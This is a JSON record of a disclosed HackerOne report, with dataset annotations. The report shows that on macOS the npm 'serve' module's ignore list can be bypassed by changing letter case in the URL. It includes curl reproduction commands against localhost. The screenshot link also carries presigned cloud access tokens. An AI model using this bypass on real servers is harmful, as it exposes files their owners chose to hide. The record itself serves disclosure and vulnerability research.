{
    "reported_to": "Node.js third-party modules",
    "reported_by": "tungpun ",
    "title": "[serve] Directory listing and File access even when they have been set to be ignored",
    "content": "\nI would like to report a vulnerability in serve on macOS.\nIt allows listing directory and reading local files on the target server.\nModule\nmodule name: serve\nversion: 6.5.3\nnpm page: https://www.npmjs.com/package/serve\nModule Description\nEver wanted to share a project on your network by running just a command? Then this module is exactly what you're looking for: It provides a neat interface for listing the directory's contents and switching into sub folders.\nIn addition, it's also awesome when it comes to serving static sites!\nVulnerability\nSteps To Reproduce:\nOn macOS:\nInstall serve:\n$ npm i serve\nCreate an application that uses serve for file serving listing and set a few folders and files in the ignore config.\nCode 122 Bytes\n1const serve = require('serve')\n2const server = serve(__dirname, {\n3      port: 6060,\n4      ignore: ['sec', 'secret.html']\n5})\nRun the app\n$ node app.js\nNow, the current directory will be served by this module on port 6060 with the exception of folder sec and file secret.html\nIf we try to request these ignored files/directories, we get a Not Found error\nCode 65 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/secret.html'\n2Not Found\nor if we replace e character with URI encoded form %65, it still be ignored:\nCode 67 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/s%65cret.html'\n2Not Found\nHowever, I found a way to access that file by using uppercase format.\nCode 80 Bytes\n1$ curl --path-as-is 'http://127.0.0.1:6060/sECret.html'\n2This is secret content!!\nTo list an ignored directory:\nhttp://127.0.0.1:6060/sEc\n<image_0>\nSupporting Material/References:\nmacOS High Sierra 10.13.3\nnode v8.10.0\nnpm 5.6.0\nChrome Version 65.0.3325.162 (Official Build) (64-bit)\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nIt bypasses the ignore files/directories feature and allows an attacker to read a file or list the directory that the victim has not allowed access to.\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Information Exposure Through Directory Listing"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/279/417/ba78749a5cf433672a9ac793509deec5110eed57/serve.png?response-content-disposition=attachment%3B%20filename%3D%22serve.png%22%3B%20filename%2A%3DUTF-8%27%27serve.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4W5YEBW%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T170343Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICvZ%2Ffic%2BKJraC1kz9f7tRwav%2BFfnCwBJlOPORS93QY8AiBwfFXLK91b76PRFuf9c1%2Fnpe2uhaCjkq9o%2B9vxrP2xFyqyBQgyEAMaDDAxMzYxOTI3NDg0OSIMNp%2BNYkioMsnHJUcYKo8FnUDLKxXFuoEToltOI%2FD4avO2d2lUOWGc9STUQV3ASqOa92EFd8nvq6XfuoZeHQQZpQP%2BqrkWd0m3Iiv6feR8LZnavV0NVvPG1R%2BAG%2BcTYdWOcTWM2D4%2FY8gra6KUMWCwMYiD2CVfI6TEivJlIc6nW0TuRLp8m4hhk08GhGZOajGMtcyiWPwdDZlSHC%2BLwxZft89gms%2B8hlvBu3DZBcy4AgRj26UJ5oeGA0uvddWSsVaXS4QQziwzJUL4ZJVHJ7c8BV9GHHrZMUUWsc8Xdz5fCX8pbfkLWYHWX1YR9gzcmiil4%2FBKvmogdq6rHBSHijToDITElFiP3BzMtx9nkXMy5ONwNLgudrd7TVsnwRryxL1ZDv%2Bp%2F4ALJvl5ZM%2FjNfSssQpEyP0JpvuhxmA20KcHbu%2B0IkMYYcq8hJyqkj2Ry6I30DmSq8pd07mywg06%2F1EBEFqLPUGPZDhQ2BytzHqBG%2BP0FWgD%2FdxLCZD8IyRkSFgRFE2pjtp%2Binrw8iSbIbAObUwqUIHZmcW6iIBGbcMJ1v0XvskRNuyUDU%2BKg12cJLSyH%2FCQ25rjQcvHPZF%2F4wPXOQPgnyzkEwHJIm55LygGPqokXYzlFh%2B%2BEoP18I2NImqQIBLGgR6daa6SeGT8UwINq1oHzEfztfx8ht4TuSICMOsatQPrsia0nWugtfeVYFLhoyQetU4sCWP87vJY2gs4urx58HhswWsLh7lYT%2BWaRfznyXenWJC1shH7ihfEdUp%2BDnEPgHl05TpWBNQ7PDv5DhKdwJ74WEj6ZiyuvpdOMqX7E%2BsLEc5g9h0wWUnXWyB1UKf0GfEyjy6nDsQYjqcYPun4PNfm37TUBsFPYFuV4MijbDUTgsQLURQrOwL6WzCy15C%2FBjqyAdBr3S28w%2Bo00FbUyjxq27ZvYBsI89rHLKW786niN6lUFHLJUIaUpHpTb%2BkItosmPVhUNq71s6ztM9qxABK8jBOdnK6pry8PEEbKCtsQjjJsEh8zQ6fW1ipYM%2BEHBOjMwJOHhk6ZkZ8WAwWg%2BztgrQQhwk0zxzzN5o7X39RzA8z6iinj2gPJ7dNxgDeSUAeaBIc2kV5CizQu0mm6bdh1A3xIMN5IyaLEHWxPy3R56vFM940%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4a6b29f54b994b9541aed484a99a1ba3f2a97b5cdc7020f9256bfc8181d3264b"
    },
    "disclosed_date": 1527808680,
    "report_url": "https://hackerone.com/reports/330650",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install serve: npm i serve"
        ],
        [
            2,
            "Create an app with serve that ignores specific files/folders (e.g., 'sec', 'secret.html')"
        ],
        [
            3,
            "Run the app: node app.js"
        ],
        [
            4,
            "Access ignored files/folders by using uppercase characters in the URL (e.g., 'http://127.0.0.1:6060/sECret.html')"
        ]
    ],
    "vuln_description": "The serve module on macOS fails to properly enforce ignore rules when files/directories are accessed using uppercase characters, allowing unauthorized access to restricted content.",
    "reason": "The vulnerability involves a simple case sensitivity issue in path matching, which is a straightforward discovery once the tester experiments with different character cases in URLs.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}